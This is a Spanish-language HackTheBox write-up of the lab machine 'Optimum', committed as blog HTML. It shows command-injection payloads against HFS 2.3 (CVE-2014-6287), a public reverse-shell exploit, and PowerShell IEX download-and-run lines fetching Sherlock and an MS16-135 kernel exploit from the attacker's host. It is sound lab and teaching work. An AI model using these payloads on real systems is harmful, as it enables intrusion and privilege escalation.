@@ -1,0 +1,1450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Optimum</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Optimum | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Optimum" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel." />
+<meta property="og:description" content="Máquina Windows nivel fácil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel." />
+<link rel="canonical" href="http://localhost:4000/htb/optimum" />
+<meta property="og:url" content="http://localhost:4000/htb/optimum" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-21T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png" />
+<meta property="twitter:title" content="HackTheBox - Optimum" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-21T00:00:00-07:00","datePublished":"2021-08-21T00:00:00-07:00","description":"Máquina Windows nivel fácil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel.","headline":"HackTheBox - Optimum","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/optimum"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/optimum"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Optimum</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-21">21 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png" alt="HackTheBox - Optimum">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel fácil. Evitamos los filtros que nos ponga <strong>HTTP File Server</strong>, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste <strong>kernel</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6optimumHTB.png" alt="6optimumHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1">ch4p</a> (e l  c r e a d o r).</p>
+
+<p>Vamos a “<strong>transformer</strong>” nuestro destino.</p>
+
+<p>Encontraremos un servidor web con el servicio <code>HTTP File Server</code> en su versión <code>2.3</code>, jugaremos con eso para entender una vulnerabilidad y ejecutar comandos con ella en el sistema. Obtendremos una <strong>reverse Shell</strong> como el usuario <code>kostas</code>.</p>
+
+<p>Nuestra terminal estará limitada a ejecutar procesos de <code>32 bits</code>, moveremos fichas para generar una nueva, pero que nos permita ejecutar instrucciones de <code>64 bits</code>, <strong>pero ¿para qué?…</strong></p>
+
+<p>Encontraremos varios caminos para escalar privilegios, usaremos uno que se aprovecha del kernel (<code>MS16-135</code>), peeeeeeeeero para su correcta ejecución necesitaremos estar en una arquitectura de <code>64 bits</code>. <strong><em>E AY LHA RASON!</em></strong></p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Vulns conocidas peeeero le cuesta llegar a ser real :(</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Eclipse eterno.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Exploramos el servicio <strong>HFS</strong> sobre el puerto 80</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación: jugamos con el servicio <strong>HFS</strong></a>.
+    <ul>
+      <li><a href="#hfs-cve-2014-6287">Validamos ejecución remota de comandos usando <strong>CVE-2014-6287</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#ps-architecture">Descubrimos la arquitectura real en la que corren nuestros scripts de <strong>PowerShell</strong></a>.</li>
+      <li><a href="#ms16-135">Explotamos el <strong>kernel</strong> y obtenemos sesión como <strong>nt authority\system</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Empezaremos viendo que puertos tiene abiertos externamente la máquina, esto nos sirve para empezar a direccionar nuestra investigación y posterior enumeración. Usaremos <code>nmap</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.8 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ese escaneo nos muestra:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.8
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.8 ()	Status: Up
+Host: 10.10.10.8 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
+# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 274.47 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos brinda un servidor web (pagina web).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ya que sabemos que solo el puerto <code>80</code> esta expuesto, vamos a ver que versión y scripts tienen relación con ese puerto, en este caso al ser un solo puerto no es necesario usar la función <code>extractPorts</code> que referenciamos antes, pero en caso de contar con muuuuuchos puertos esta muy bien usarla y no copiar uno a uno cada puerto.</p>
+
+<pre><code class="language-bash">❱ nmap -p 80 -sC -sV 10.10.10.8 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y con este escaneo obtenemos:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.8
+Nmap scan report for 10.10.10.8
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.80 seconds
+</code></pre>
+
+<p>Tenemos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">HttpFileServer httpd 2.3</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Servicio <code>Http File Server</code> en su versión <code>2.3</code>.</li>
+</ul>
+
+<p>Por ahora nada más (aunque ya con la versión es bastante e.e). Exploremos el servidor web a ver como romperlo.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p>Como vimos existe un servicio llamado <code>Http File Server</code> montado en el puerto <code>80</code>, pues validémoslo y en dado caso conozcamos de que se trata…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un poco feita la interfaz 😁, pero vemos varias cositas, un link hacia un <code>login</code>, una barra de búsqueda (jmm) y de los demás botones el único llamativo es <code>Get list</code> en <strong><em>Actions</em></strong>, el cual nos redirecciona a:</p>
+
+<pre><code class="language-html">http://10.10.10.8/?tpl=list&amp;folders-filter=\&amp;recursive
+</code></pre>
+
+<p>Y quizás podríamos jugar con ella… Veamos de que se trata <strong>HFS</strong>:</p>
+
+<p>🌎 <a href="https://www.rejetto.com/hfs/"><strong><em><code>HFS (HTTP File Server)</code> es un servidor web diseñado para publicar y compartir archivos</em></strong></a>.</p>
+
+<p>Bien, sencillito.</p>
+
+<p>Pues recordemos que tenemos una versión del software, vamos a la web y busquemos cositas relacionadas con esa versión, quizás hay vulnerabilidades conocidas…</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Buscando llegamos a este <code>CVE</code>:</p>
+
+<ul>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287">cve.mitre.org - CVE-2014-6287</a>.</li>
+</ul>
+
+<p>Se trata de una ejecución remota de comandos -gracias- a una pobre sanitización llevada a cabo por expresiones regulares sobre el archivo <code>ParserLib.pas</code>. La explotación se logra mediante un <a href="https://www.whitehatsec.com/glossary/content/null-byte-injection">null byte (%00)</a>, ya que bypassea el regex, detiene tooodo lo anterior a él y simplemente ejecuta lo que este después, o sea, nuestros comandos locochones…</p>
+
+<p>⚪⚪⚪ <strong><em><code>Null bytes</code> are put in place to terminate strings or be a place holder in code, and injecting these into URLs can cause web applications to not know when to terminate strings and manipulate the applications.</em></strong> <a href="https://www.whitehatsec.com/glossary/content/null-byte-injection">whitehatsec</a>.</p>
+
+<p>Uff suena prometedor, investigando un poquito más llegamos es este recurso:</p>
+
+<ul>
+  <li><a href="https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-2-3">Vulnerability analysis of HFS 2.3</a>.</li>
+</ul>
+
+<p><strong>Un análisis de la vuln, esta bien detallado, <span style="color: white;">échenle un ojo.</span></strong></p>
+
+<hr />
+
+<h2 id="hfs-cve-2014-6287">Validamos <u>RCE</u> explotando <u>CVE-2014-6287</u> <a href="#hfs-cve-2014-6287">📌</a></h2>
+
+<p>Leyendo sobre la explotación, todo pasa en el apartado <code>search</code> (en nuestra enumeración anterior lo vimos).</p>
+
+<p>Una consulta normal por ejemplo del texto <code>hola</code>, redireccionaría a:</p>
+
+<pre><code class="language-html">http://10.10.10.8/?search=hola
+</code></pre>
+
+<p>Y veríamos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaNORMAL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nada anormal…</p>
+
+<p>En el caso de la explotación la consulta sería distinta, ya que se le agrega el <code>null byte</code> para bypassear el filtro regex yyyyyy simplemente agregaríamos el comando a ejecutar:</p>
+
+<pre><code class="language-py">http://10.10.10.8/?search=hola%00{.exec|aca_el_comando_a_ejecutar.}
+</code></pre>
+
+<p>Por ejemplo:</p>
+
+<pre><code class="language-py">http://10.10.10.8/?search=hola%00{.exec|whoami.}
+</code></pre>
+
+<p>En la respuesta veríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaWITHnullBYTE_execWHOAMI.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lo único distinto que vemos es un símbolo al lado de <code>hola</code>, pero no tenemos el reflejo del comando <code>whoami</code> 😔</p>
+
+<p>Como una de las pruebas que debemos hacer seria intentar lanzarnos paquetes <code>ICMP</code> con ayuda del comando <code>ping</code>, si en nuestra máquina recibimos los paquetes entonces confirmamos que existe la ejecución remota de comandos solo que no se reflejan en la web. Pues pongámonos en escucha por la interfaz <a href="https://www.reddit.com/r/networking/comments/5mnnjh/explanation_on_tun0_network_device/">tun0</a> (donde se monta la <strong>VPN</strong>, en mi caso solo tengo la de HTB**, la confirman con <code>ipconfig</code> o <code>ip a</code>) y estemos atentos por si llegan paquetes <code>ICMP</code> (que son los que envía el comando <code>ping</code>):</p>
+
+<pre><code class="language-bash">❱ tcpdump -i tun0 icmp
+</code></pre>
+
+<p>Y ahora desde la web lanzamos:</p>
+
+<pre><code class="language-py">http://10.10.10.8/?search=hola%00{.exec|ping%2010.10.14.2.}
+</code></pre>
+
+<p>Pero no recibimos nada, seguimos probando… Yyyy finalmente llegamos al resultado de este intento:</p>
+
+<pre><code class="language-py">http://10.10.10.8/?search=hola%00{.exec|powershell.exe -c "ping 10.10.14.2".}
+</code></pre>
+
+<p>Cuando lo ejecutamos en la web no vemos nada reflejado (tampoco debería), peeeeeeeeeeero en nuestro analizador de tráfico:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_tcpdump_ICMPreceived.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Vemos los paquetes enviados por la dirección IP <code>10.10.10.8</code> (la máquina víctima) hacia nuestra máquina, así que existe la ejecución remota de comandos (: YYYYYYYYYYYYYy entendimos como funciona la vulnerabilidad.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_gif_snoopdogDANCEhappy.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>…</p>
+
+<p>Ahora que sabemos que los comandos se están ejecutando podemos aprovecharnos de un exploit público el cual <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell">lanza una reverse Shell generada con <code>PowerShell</code></a>, la encodea a <strong>base64</strong> y como comandos que ejecutara el sistema le indica que decodee la cadena y la interprete. No debemos ponernos en escucha, ya que el mismo script lo hace: <code>nc -nlvp el_puerto_que_le_indiquemos</code>.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/49584">HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)</a>.</li>
+</ul>
+
+<p>Lo descargamos y en su código cambiamos las variables <code>lhost</code> por nuestra dirección IP y <code>lport</code> por el puerto en el que queremos recibir la Shell. (El exploit fue creado para esta máquina, ya que trae por default que el servidor vulnerable esta sirviendo en la dirección IP <code>10.10.10.8</code>)</p>
+
+<p>Y ahora si lo ejecutamos:</p>
+
+<pre><code class="language-bash">❱ python3 hfsRCE.py
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPY_kostasRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PEEEEEEEEEEEEEEEERFECTIIIIIIIIIIiii11isadifjoasdifjSIMOOOOOOOoo, tenemos una <strong>PowerShell</strong> en el sistema como el usuario <code>kostas</code> (:</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Después de estar en un laberinto suuuuuuuper largo finalmente conseguimos explotar esta vaina.</p>
+
+<p>Enumerando el sistema vemos que podemos ejecutar <code>systeminfo</code>, aprovechemos las muuuuuuchas herramientas que existen para ver si el kernel o la versión del SO tiene alguna vulnerabilidad.</p>
+
+<ul>
+  <li><a href="https://oscp.securable.nl/privilege-escalation">Apoyados en esta guía de <strong>PrivEsc</strong> caemos en nuestro siguiente recurso</a>.</li>
+</ul>
+
+<p>El que nos muestra unos resultados sencillos y directos es <a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> (que ya esta obsoleto, pero sigue funcionando), <strong>Sherlock</strong> es un script de <code>PowerShell</code> que busca vulnerabilidades relacionadas con “parches” del sistema.</p>
+
+<p>Entonces, podemos ya sea, descargar el archivo, subirlo e importar su función principal llamada <code>Find-AllVulns</code> (si revisas el código la vez) oooooooo simplemente descargarlo, levantar un servidor <strong>web</strong> y desde la consola de <strong>PowerShell</strong> indicarle que cargue un módulo (el contenido) de x URL (nuestro script de <code>Sherlock.ps1</code>), hagamos esta última:</p>
+
+<ul>
+  <li><a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1</a>.</li>
+</ul>
+
+<p>Levantamos servidor web donde esté el archivo:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<p>Y ahora desde la <strong>PS</strong> indicamos:</p>
+
+<pre><code class="language-powershell">IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/Sherlock.ps1')
+</code></pre>
+
+<p>Ya el contenido del script estaría importado como un <strong>módulo</strong> en el sistema, nos quedaría llamarlo:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\kostas\Videos&gt; Find-AllVulns
+</code></pre>
+
+<p>De los resultados que arroja detallamos estos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_SherlockREPORT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Existen 3 vulnerabilidades que parecen afectar el sistema, pues empecemos a profundizar a ver…</p>
+
+<hr />
+
+<h2 id="ps-architecture">Descubrimos arquitectura real en la que corren nuestros scripts de <u>PowerShell (PS)</u> <a href="#ps-architecture">📌</a></h2>
+
+<p>Dejando algunos objetos de lado llegamos al boletín <code>MS16-135</code>, la explotación de esa vuln es dada gracias a un problema con el kernel que permite escalar privilegios sin importar que usuario seamos…</p>
+
+<p>Les dejo estos dos recursos para que profundicen:</p>
+
+<ul>
+  <li><a href="https://www.elladodelmal.com/2017/04/como-explotar-el-bug-de-ms16-135-en.html">Cómo explotar el bug de MS16-135 en Windows x64 con PowerShell &amp; Metasploit “Like a Boss”</a>.</li>
+  <li><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/digging-windows-kernel-privilege-escalation-vulnerability-cve-2016-7255/">Digging Into a Windows Kernel Privilege Escalation Vulnerability: CVE-2016-7255</a>.</li>
+</ul>
+
+<p>Enfocados en ese boletín llegamos a esta prueba de concepto en <strong>PS</strong>:</p>
+
+<ul>
+  <li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/MS16-135.ps1">MS16-135.ps1</a>.</li>
+</ul>
+
+<p>Haremos lo mismo que con <code>Sherlock</code>, descargamos el recurso, levantamos servidor web e importamos su contenido. En este caso no tendremos que llamar ninguna función porque el código no esta en ninguna, por lo que una vez ejecutemos:</p>
+
+<pre><code class="language-powershell">IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1')
+</code></pre>
+
+<p>Interpretara el código y lo ejecutara…</p>
+
+<p>El output después de ejecutarlo es confuso:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135error_NOTx64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pero si validamos <code>systeminfo</code> tenemos:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; systeminfo
+...
+System Type:               x64-based PC
+...
+</code></pre>
+
+<p>WTF, debería funcionarnos el script, ya que <strong><em>SI</em></strong> estamos en una arquitectura <code>x64</code>… ¿O no?</p>
+
+<p>Pues buscando info para validar esto encontramos este post:</p>
+
+<ul>
+  <li><a href="https://ridicurious.com/2018/10/17/4-ways-to-find-os-architecture-using-powershell-32-or-64-bit/">4 Ways to Find OS Architecture using PowerShell (32 or 64 bit)</a>.</li>
+</ul>
+
+<p>En la cuarta forma de validarlo quedamos anonadados 😲</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_validatingOSarch_IntPtr.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Solo podemos obtener dos respuestas: <code>4</code> (4<em>4=32 (32 bits)) u <code>8</code> (8</em>8=64 (64 bits)).</p>
+
+<p>Veamos:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; [System.IntPtr]::Size
+4
+</code></pre>
+
+<p>🙆‍♂️ kheeeeeeeeeeeeeeeeeeeeeee!!</p>
+
+<p><strong><span style="color: grey;">HOY (un día)</span></strong>: <strong><em><span style="color: yellow;">No he encontrado él -porque- de esto, seguiré investigando y dejaré un update :P</span></em></strong> <br />
+<strong><span style="color: grey;">UPDATE (3 días después)</span></strong>: Según <strong><em><span style="color: yellow;"><a href="https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell-as-system">0xdf en su writeup</a>: “That is because the HFS process is likely running as a 32-bit process”.</span></em></strong></p>
+
+<p>Intentando corroborar lo obtenido llegamos a este hilo en <strong>stackoverflow</strong>:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/25407634/check-processor-architecture-and-proceed-with-if-statement#answer-25407836">check processor architecture and proceed with if statement</a>.</li>
+</ul>
+
+<p>Usando:</p>
+
+<pre><code class="language-powershell">[System.Environment]::Is64BitProcess
+</code></pre>
+
+<p>Podemos validar si los procesos ejecutados están siendo tomados desde una arquitectura <code>64 bits</code>:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; [System.Environment]::Is64BitProcess
+False
+</code></pre>
+
+<p>Y no, confirmamos que no estamos en una arquitectura de <code>64 bits</code> sino en una de <code>32 bits</code>…</p>
+
+<p>Buscando maneras de cambiarnos a <code>64 bits</code> llegamos a este nuevo hilo:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe">How to launch 64-bit powershell from 32-bit cmd.exe?</a>.</li>
+</ul>
+
+<hr />
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_stackoverflow_CHANGEarch32to64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>La que nos permite el cambio es ejecutar <code>powershell</code> desde la ruta <strong>nativa</strong>, esto para poder ejecutar código de <code>64 bits</code> sobre una arquitectura de <code>32 bits</code>.</p>
+
+<p>Pues hagamos la fácil, modifiquemos el script con el que obtuvimos la reverse Shell y en vez de llamar <code>powershell.exe</code> sin ruta absoluta, agreguémosle la ruta nativa y validemos si conseguimos estar en <code>64 bits</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPYsource_updatePSnative.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ejecutamos yyyyyyyyyyyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_PSnative_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>LISTOOOOOOOOOOOOOOOOOOOOOOOONEEEEEEES, ahora sííííííí …… AHHHHHHHHHHHHHHHHHHHHHHHHHHLKfjsadklfjlñaksdlkjld e.e</p>
+
+<hr />
+
+<h2 id="ms16-135">Conseguimos <u>Shell</u> como <u>nt authority\system</u> <a href="#ms16-135">📌</a></h2>
+
+<p>Volvamos a ejecutar el contenido del script (ya no deberíamos ver ese error):</p>
+
+<pre><code class="language-powershell">PS C:\&gt; IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>¡DE MARAVILLA!! Ya funciona, pero parece que todo esta igual ¿no? e.e Puesssssssssssssss:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_sysSH_MS135.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
